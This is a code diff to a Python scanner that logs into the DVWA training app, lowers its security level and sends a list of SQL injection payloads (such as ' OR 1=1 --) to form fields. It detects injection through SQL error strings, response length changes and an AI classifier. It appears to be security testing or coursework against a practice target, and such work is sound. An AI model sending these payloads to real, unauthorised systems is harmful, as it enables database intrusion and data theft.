@@ -7,6 +7,7 @@ from bs4 import BeautifulSoup
 from ai.feature_extractor import extract_features
 from ai.ai_engine import predict
 
+
 # ---------------- PATH CONFIG ---------------- #
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -18,9 +19,22 @@ LOGIN_URL = BASE_URL + "login.php"
 
 session = requests.Session()
 
+
+# ---------------- SQL PAYLOAD LIST ---------------- #
+
+payloads = [
+    "' OR 1=1 --",
+    "' OR '1'='1",
+    "' OR 1=1#",
+    "' OR '1'='1' --",
+    "' UNION SELECT null,null--"
+]
+
+
 # ---------------- LOGIN FUNCTION ---------------- #
 
 def login_dvwa():
+
     print("[+] Logging into DVWA for SQL testing...")
 
     response = session.get(LOGIN_URL)
@@ -39,7 +53,8 @@ def login_dvwa():
     session.post(LOGIN_URL, data=login_data)
     print("[+] Login successful.")
 
-    
+    # Set security level LOW
+
     security_url = BASE_URL + "security.php"
     sec_page = session.get(security_url)
     soup = BeautifulSoup(sec_page.text, "html.parser")
@@ -54,12 +69,14 @@ def login_dvwa():
     }
 
     session.post(security_url, data=security_data)
+
     print("[+] Security level set to LOW.")
 
 
 # ---------------- LOAD FORMS ---------------- #
 
 def load_forms():
+
     if not os.path.exists(SCANNER_OUTPUT):
         print("[!] Scanner output.json not found.")
         return None
@@ -88,6 +105,7 @@ def test_sqli(forms):
             continue
 
         input_names = [inp.get("name") for inp in inputs if inp.get("name")]
+
         if "id" not in input_names:
             continue
 
@@ -95,15 +113,18 @@ def test_sqli(forms):
 
         try:
 
-             # -------- Get CSRF token -------- #
+            # -------- Get CSRF token -------- #
+
             page_response = session.get(action)
             soup = BeautifulSoup(page_response.text, "html.parser")
 
             token_input = soup.find("input", {"name": "user_token"})
             user_token = token_input["value"] if token_input else ""
 
-             # -------- Normal Request -------- #
+            # -------- Normal Request -------- #
+
             start_normal = time.time()
+
             normal_response = session.get(
                 action,
                 params={
@@ -112,87 +133,88 @@ def test_sqli(forms):
                     "user_token": user_token
                 }
             )
+
             normal_time = time.time() - start_normal
             normal_text = normal_response.text.lower()
 
-            # -------- Injected Request -------- #
-            payload = "' OR 1=1 --"
+            # -------- Test Each Payload -------- #
 
-            start_injected = time.time()
-            injected_response = session.get(
-                action,
-                params={
-                    "id": payload,
-                    "Submit": "Submit",
-                    "user_token": user_token
-                }
-            )
-            injected_time = time.time() - start_injected
-            injected_text = injected_response.text.lower()
-            
-            # -------- CLI OUTPUT -------- #
+            for payload in payloads:
 
-            length_diff = len(injected_text) - len(normal_text)
+                print(f"   → Testing Payload: {payload}")
 
-            print(f"Normal Status Code   : {normal_response.status_code}")
-            print(f"Injected Status Code : {injected_response.status_code}")
-            print(f"Normal Response Time : {round(normal_time, 4)} sec")
-            print(f"Injectth Died Resp Time   : {round(injected_time, 4)} sec")
-            print(f"Response Lengff : {length_diff}")
+                start_injected = time.time()
 
+                injected_response = session.get(
+                    action,
+                    params={
+                        "id": payload,
+                        "Submit": "Submit",
+                        "user_token": user_token
+                    }
+                )
 
-            # ---------------- RULE-BASED DETECTION ---------------- #
+                injected_time = time.time() - start_injected
+                injected_text = injected_response.text.lower()
 
-            sql_error_patterns = [
-                "you have an error in your sql syntax",
-                "mysqli",
-                "mysql",
-                "warning",
-                "fatal error"
-            ]
+                length_diff = len(injected_text) - len(normal_text)
 
-            rule_based_detected = False
+                print(f"   Injected Status Code : {injected_response.status_code}")
+                print(f"   Injected Response Time : {round(injected_time,4)} sec")
+                print(f"   Response Length Diff : {length_diff}")
 
-            for error in sql_error_patterns:
-                if error in injected_text:
+                # ---------------- RULE-BASED DETECTION ---------------- #
+
+                sql_error_patterns = [
+                    "you have an error in your sql syntax",
+                    "mysqli",
+                    "mysql",
+                    "warning",
+                    "fatal error"
+                ]
+
+                rule_based_detected = False
+
+                for error in sql_error_patterns:
+                    if error in injected_text:
+                        rule_based_detected = True
+                        break
+
+                if len(injected_text) > len(normal_text) + 100:
                     rule_based_detected = True
+
+                # ---------------- AI DETECTION ---------------- #
+
+                features = extract_features(
+                    normal_text,
+                    injected_text,
+                    injected_response.status_code,
+                    normal_time,
+                    injected_time
+                )
+
+                prediction, probability = predict(features)
+
+                # ---------------- FINAL DECISION ---------------- #
+
+                if rule_based_detected or prediction == 1:
+
+                    confidence = 95.0 if rule_based_detected else round(probability * 100, 2)
+
+                    print(f"[✔] SQL Injection Detected with payload: {payload}")
+                    print(f"Confidence: {confidence}%\n")
+
+                    vulnerable.append({
+                        "url": action,
+                        "method": method.upper(),
+                        "payload": payload,
+                        "type": "SQL Injection",
+                        "severity": "High",
+                        "confidence": confidence
+                    })
+
+                    # Stop testing more payloads once vulnerability confirmed
                     break
-
-            if len(injected_text) > len(normal_text) + 100:
-                rule_based_detected = True
-
-            # ---------------- AI DETECTION ---------------- #
-
-            features = extract_features(
-                normal_text,
-                injected_text,
-                injected_response.status_code,
-                normal_time,
-                injected_time
-            )
-
-            prediction, probability = predict(features)
-
-            # ---------------- FINAL DECISION ---------------- #
-
-            if rule_based_detected or prediction == 1:
-
-                if rule_based_detected:
-                  confidence = 95.0   
-                else:
-                  confidence = round(probability * 100, 2)
-
-                print(f"[✔] SQL Injection Detected at {action}")
-                print(f"Confidence: {confidence}%\n")
-
-                vulnerable.append({
-                    "url": action,
-                    "method": method.upper(),
-                    "payload": payload,
-                    "type": "SQL Injection",
-                    "severity": "High",
-                    "confidence": confidence
-                })
 
         except Exception as e:
             print(f"[!] Error testing {action}: {e}")
@@ -208,6 +230,7 @@ if __name__ == "__main__":
     login_dvwa()
 
     forms = load_forms()
+
     if forms is None:
         exit()
 
